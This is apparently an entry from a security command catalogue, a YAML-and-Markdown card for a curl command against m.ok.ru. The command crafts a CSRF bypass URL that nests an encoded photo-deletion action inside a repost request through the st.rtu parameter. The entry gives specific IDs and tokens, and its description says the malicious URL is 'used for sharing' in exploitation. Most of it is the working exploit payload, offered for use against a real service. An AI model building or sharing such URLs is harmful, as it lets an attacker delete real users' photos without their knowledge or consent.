---
id: cmd-craft-csrf-bypass
data: >-
  curl -G "http://m.ok.ru/dk" --data-urlencode "st.cmd=friendReshareTopic"
  --data-urlencode "st.topicId=64607766975788" --data-urlencode
  "st.rtu=/dk?bk=ActionBus&st.cmd=actionBus&st.rtu=%2Fdk%3Fst.cmd%3DuserPhoto%26st.phoId%3D812501293868%26st.layer%3Dsoon%26_prevCmd%3DuserPhoto%26tkn%3D2696%26_prevCmd%3DuserPhoto%26tkn%3D6230%26st.actions%3D%7B%22photos.delete%22%3A%7B%22photoId%22%3A%22812501293868%22%2C%22groupId%22%3Anull%7D%7D%26_i_loc_rdr%3D1"
  --data-urlencode "st.friendId=584798454828" --data-urlencode
  "_prevCmd=friendMediaStatusComments" --data-urlencode "tkn=7824"
tags:
  - csrf
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:15.567Z'
verified: false
validated: true
submitted: true
---
# craft-csrf-bypass-url

## Command

```bash
curl -G "http://m.ok.ru/dk" --data-urlencode "st.cmd=friendReshareTopic" --data-urlencode "st.topicId=64607766975788" --data-urlencode "st.rtu=/dk?bk=ActionBus&st.cmd=actionBus&st.rtu=%2Fdk%3Fst.cmd%3DuserPhoto%26st.phoId%3D812501293868%26st.layer%3Dsoon%26_prevCmd%3DuserPhoto%26tkn%3D2696%26_prevCmd%3DuserPhoto%26tkn%3D6230%26st.actions%3D%7B%22photos.delete%22%3A%7B%22photoId%22%3A%22812501293868%22%2C%22groupId%22%3Anull%7D%7D%26_i_loc_rdr%3D1" --data-urlencode "st.friendId=584798454828" --data-urlencode "_prevCmd=friendMediaStatusComments" --data-urlencode "tkn=7824"
```

## Description

This curl command crafts and sends a GET request to m.ok.ru/dk with encoded parameters to demonstrate the CSRF bypass via st.rtu, embedding a photo deletion payload in a repost context. Use it to generate or test the malicious URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-G` | Treats data as query string for GET | Yes |
| `--data-urlencode` | URL-encodes parameters like st.cmd, st.rtu | Yes |
| `st.cmd` | Command type (e.g., friendReshareTopic) | Yes |
| `st.topicId` | ID of topic for repost context | Yes |
| `st.rtu` | Nested encoded path with deletion payload | Yes |
| `st.friendId` | Friend ID for repost | Yes |
| `tkn` | Request token | Yes |

## Examples

### Basic Usage

```bash
curl -G "http://m.ok.ru/dk" --data-urlencode "st.cmd=friendReshareTopic" --data-urlencode "st.topicId=64607766975788" --data-urlencode "st.rtu=ENCODED_PAYLOAD" --data-urlencode "tkn=7824"
```

### Advanced Usage

Include full nested st.rtu as shown in the main command for photo deletion.

## Expected Output

HTTP response from m.ok.ru, potentially including redirect or success indicators for the repost dialog. In exploitation, the URL itself is used for sharing; response may show JSON or HTML for the dialog.

## Related

- [[Related Procedure: Craft Malicious URL with Embedded Photo Deletion]]
